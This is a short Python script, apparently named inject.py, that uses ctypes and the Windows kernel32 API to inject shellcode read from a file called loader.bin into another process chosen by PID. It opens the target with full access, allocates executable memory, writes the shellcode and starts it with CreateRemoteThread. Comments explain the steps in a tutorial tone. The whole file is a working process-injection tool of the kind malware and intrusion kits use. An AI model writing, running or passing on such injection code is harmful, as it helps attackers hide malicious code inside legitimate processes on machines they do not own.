from ctypes import *
import sys
if len(sys.argv) < 2:
    print("Enter PID\n","inject.py 1234")
kernel = windll.kernel32
pid = int(sys.argv[1])

fp = open("loader.bin",'rb')
ShellCode = fp.read()

PROCESS_ALL_ACCESS  = (0x000F0000 | 0x00100000 |0xFFFF)

hprocess = kernel.OpenProcess(PROCESS_ALL_ACCESS,False,pid)

dwstack  = len(ShellCode)
virtual_mem = (0x1000 | 0x2000)
page_protection = 0x40

allocation = kernel.VirtualAllocEx(hprocess,0,dwstack,virtual_mem,page_protection)

result = c_int(0)   # decelerate variable for example in c language ----> int result;
writemem = kernel.WriteProcessMemory(hprocess,allocation,ShellCode,dwstack,byref(result))
# byref get address via reference

tID = c_ulong(0)

remotethread = kernel.CreateRemoteThread(hprocess,None,0,allocation,0,0,byref(tID))


#OpenProcess  (0x000F0000L   | 0x00100000L |0xFFFF)
# 0x000F0000L   | 0x00100000L |0xFFFF -----> PROCESS_ALL_ACCESS
